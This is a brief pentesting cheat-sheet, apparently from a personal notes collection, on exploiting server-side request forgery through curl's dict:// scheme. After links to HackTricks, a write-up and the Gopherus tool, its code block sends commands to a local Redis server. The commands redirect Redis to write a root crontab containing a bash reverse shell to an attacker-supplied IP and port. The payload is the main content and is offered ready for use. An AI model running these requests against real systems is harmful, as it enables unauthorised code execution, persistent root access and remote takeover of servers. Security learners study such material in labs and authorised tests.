# SSRF via Curl

Usefull links :
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#dict
- https://infosecwriteups.com/exploiting-server-side-request-forgery-ssrf-vulnerability-faeb7ddf5d0e

Usefull tools 
- https://github.com/tarunkant/Gopherus
```bash
dict ://127.0.0.1:6379/config set dir /var/spool/cron/
dict ://127.0.0.1:6379/config set dbfilename root
dict ://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/"ip"/"port" 0>\x261\n\n\n"
dict ://127.0.0.1:6379/save
```
